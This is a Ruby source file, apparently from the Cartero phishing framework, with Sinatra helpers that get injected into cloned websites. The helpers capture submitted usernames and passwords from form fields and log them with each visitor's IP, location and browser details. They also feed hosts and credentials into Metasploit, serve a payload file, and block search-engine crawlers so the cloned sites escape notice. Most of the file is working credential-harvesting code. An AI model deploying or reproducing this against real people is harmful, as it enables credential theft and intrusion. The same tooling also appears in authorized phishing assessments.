#encoding: utf-8
module Cartero
# Documenation for SinatraHelpers
# WebServer Sinatra Helpers that will be including by default on Cloned sites.
# The modules include the following public methods
# - process_info
# - process_cred
# - return_payload
# - return_img
module SinatraHelpers
  def process_cred
    ua = Cartero::UserAgentParser.new(request.user_agent)
    ua.parse

    creds = Credential.new(
      :ip 				=> request.ip,
      :location   => request.location.data,
      :port 			=> request.port,
      :domain			=> request.host,
      :path       => request.path_info,
      :time 			=> Time.now,
      :user_agent => request.user_agent,
      :forwarded 	=> request.forwarded?,
      :data 			=> params,
      :ua_comp		=> ua.comp,
      :ua_os 			=> ua.os,
      :ua_browser => ua.browser,
      :ua_engine	=> ua.engine,
      :ua_platform => ua.platform,
      :ua_lang		=> ua.lang,
      :username		=> params[:username] || params[:email] || params[:user] || params[params.keys.select {|x| x =~ /email|user|uname/i }[0]],
      :password		=> params[:password] || params[:pwd] || params[:secret] || params[params.keys.select {|x| x =~ /pass|pwd|secret/i }[0]]
    )
    creds.save!

    process_metasploit_creds
  end

  def process_info
    @data = {}
    if (params[:key] && params[:key] != "" && params[:key] != nil ) || cookies["session_info"] != nil
      begin
        @data = JSON.parse(::Cartero::CryptoBox.decrypt(params[:key] || cookies["session_info"]),{:symbolize_names => true})
        cookies["session_info"] ||= params[:key]
      rescue RbNaCl::CryptoError
        $stdout.puts "#{Time.now} - ERROR Entity Could not be decrypt it. - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{request.location.city}/#{request.location.country} - USER_AGENT #{request.user_agent}"
        $stdout.puts "#{Time.now} - PERSON noname@cartero.com - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{request.location.city}/#{request.location.country} - USER_AGENT #{request.user_agent}"
        return
      rescue ArgumentError
        $stdout.puts "#{Time.now} - ERROR Entity Could not be parsed correctly. - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{request.location.city}/#{request.location.country} - USER_AGENT #{request.user_agent}"
        $stdout.puts "#{Time.now} - PERSON noname@cartero.com - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{request.location.city}/#{request.location.country} - USER_AGENT #{request.user_agent}"
        return
      end
      # Save or Create a new person hitting the URL path.
      save_create_person

      # if listener was started with metasploit RPC option
      process_metasploit

      puts "#{Time.now} - PERSON #{person.email} - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{request.location.city}/#{request.location.country} - USER_AGENT #{request.user_agent}"
    else
      puts "#{Time.now} - PERSON noname@cartero.com - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{request.location.city}/#{request.location.country} - USER_AGENT #{request.user_agent}"
    end
  end

  def return_payload
    return send_file(settings.payload_path, :disposition => :inline)
  end

  def return_img
    return send_file(File.expand_path("../../../data/images/image.jpg", __FILE__),
      :filename => "white.jpg",
      :type => :jpg,
      :disposition => :inline)
  end

  private

  def save_create_person
    person = Person.where(:email => @data[:email]).first

    if person.nil?
      begin
        person = Person.new(:email => @data[:email])
        person.save!
      rescue MongoMapper::DocumentNotValid
        person = Person.where(:email => @data[:email]).first
      end
    end

    person.campaigns << @data[:subject] unless person.campaigns.include?(@data[:subject])
    person.responded << "#{request.ip}:#{request.port}" unless person.responded.include?("#{request.ip}:#{request.port}")
    if params[:username] || params[:password]
      person.credentials << {
        :username		=> params[:username] || params[:email] || params[:user] || params[params.keys.select {|x| x =~ /email|user|uname/i }[0]],
        :password		=> params[:password] || params[:pwd] || params[:secret] || params[params.keys.select {|x| x =~ /pass|pwd|secret/i }[0]]
      }
    end

    ua = ::Cartero::UserAgentParser.new(request.user_agent)
    ua.parse

    person.hits << Hit.new(
      :ip 				=> request.ip,
      :location   => request.location.data,
      :port 			=> request.port,
      :domain 		=> request.host,
      :path       => request.path_info,
      :ports 			=> @data[:ports],
      :time 			=> Time.now,
      :user_agent => request.user_agent,
      :forwarded 	=> request.forwarded?,
      :data 			=> data,
      :ua_comp		=> ua.comp,
      :ua_os 			=> ua.os,
      :ua_browser => ua.browser,
      :ua_engine	=> ua.engine,
      :ua_platform => ua.platform,
      :ua_lang		=> ua.lang
    )

    person.save!
  end

  def process_metasploit
    return if settings.metasploit.nil?
    settings.metasploit.add_host({
      :workspace => settings.metasploit.get_workspace()["name"],
      :host => request.ip,
      :os_name => ua.os,
      :os_lang => ua.lang,
      :os_flavor => "Plus",
      :info => @data.map {|k,v| "#{k}=#{v}"}.join(","),
      :name => "#{@data[:email].split('@')[0]}_#{ua.os}",
      :purpose => "client"
      })

    settings.metasploit.add_client({
      :ua_string => request.user_agent,
      :host => request.ip,
      :ua_name => ua.browser.split(' ')[0],
      :ua_ver => ua.browser.split(' ')[1..-1]
      })

    return unless (params[:password] || params[:pwd] || params[:secret] || params[params.keys.select {|x| x =~ /pass|pwd|secret/i }[0]]) != nil &&
                  (params[:username] || params[:email] || params[:user] || params[params.keys.select {|x| x =~ /email|user|uname/i }[0]]) != nil

    settings.metasploit.add_cred({
      :origin_type => :service,
      :address => request.ip,
      :port => request.port,
      :service_name => 'http',
      :protocol => 'tcp',
      :module_fullname => 'cartero',
      :private_data => params[:password] || params[:pwd] || params[:secret] || params[params.keys.select {|x| x =~ /pass|pwd|secret/i }[0]],
      :private_type => :password,
      :username => params[:username] || params[:email] || params[:user] || params[params.keys.select {|x| x =~ /email|user|uname/i }[0]],
      :last_attempted_at => Time.now.to_s,
      :status => "Successful"
    })
  end

  def process_metasploit_creds
    return if settings.metasploit.nil?
    wspace = settings.metasploit.get_workspace()
    if params[:key].nil?
      # Adding hosts if it does not exists
      puts "[*] - Adding host #{request.ip} to metasploit"
      settings.metasploit.add_host({
        :workspace => wspace["name"],
        :host => request.ip,
        :os_name => ua.os,
        :os_lang => ua.lang,
        :info => request.host,
        :arch => ua.platform,
        :comm => "Cartero added host",
        :name => "#{request.ip}_#{ua.os.gsub(' ', '_')}",
        :purpose=> "client"
      })
      puts "[*] - Adding client #{ua.browser.split(' ')[0]} to metasploit"
      # Adding Web Client if it does not exists and link it to hosts.
      settings.metasploit.add_client({
        :ua_string => request.user_agent,
        :host => request.ip,
        :ua_name => ua.browser.split(' ')[0],
        :ua_ver => ua.browser.split(' ')[1..-1]
      })
    end
    # Add Credentials :-)
    puts "[*] - Adding client #{params[params.keys.select {|x| x =~ /email|user|uname/i }[0]]} to metasploit"
    # {origin_type: :service, address: '192.168.19.1', port: 9090, service_name: 'http', protocol: 'tcp',
    # module_fullname: 'auxiliary/scanner/http/cartero', workspace_id: 1,
    # private_data: 'password1', private_type: :password, username: 'Administrator', last_attempted_at: Time.now.to_s, status: "Successful"}
    settings.metasploit.add_cred({
      :workspace_id => wspace["id"] || 1,
      :origin_type => :service,
      :address => request.ip,
      :port => request.port,
      :service_name => 'http',
      :protocol => 'tcp',
      :module_fullname => 'auxiliary/scanner/http/cartero',
      :private_data => params[:password] || params[:pwd] || params[:secret] || params[params.keys.select {|x| x =~ /pass|pwd|secret/i }[0]],
      :private_type => :password,
      :username => params[:username] || params[:email] || params[:user] || params[params.keys.select {|x| x =~ /email|user|uname/i }[0]],
      :last_attempted_at => Time.now.to_s,
      :status => "Successful"
    })
  end
end
end

module Cartero
# Documenation for CrawlerBlock.
# This module for Sinatra WebServers is automatically added into cloned sites.
# The function of this is to filter our websites for robots and bots.
module CrawlerBlock
  # Regex
  CRAWLERS = /(bingbot|bot|borg|google(^tv)|yahoo|slurp|msnbot|msrbot|openbot|archiver|netresearch|lycos|scooter|altavista|teoma|gigabot|baiduspider|blitzbot|oegp|charlotte|furlbot|http%20client|polybot|htdig|ichiro|mogimogi|larbin|pompos|scrubby|searchsight|seekbot|semanticdiscovery|silk|snappy|speedy|spider|voila|vortex|voyager|zao|zeal|fast\-webcrawler|converacrawler|dataparksearch|findlinks|crawler|Netvibes|Sogou Pic Spider|ICC\-Crawler|Innovazion Crawler|Daumoa|EtaoSpider|A6\-Indexer|YisouSpider|Riddler|DBot|wsr\-agent|Xenu|SeznamBot|PaperLiBot|SputnikBot|CCBot|ProoXiBot|Scrapy|Genieo|Screaming Frog|YahooCacheSystem|CiBra|Nutch)/

  def block_and_redirect(url)
    before { redirect url, 301, "redirecting..." if request.user_agent.match(CRAWLERS) }
  end
end
end
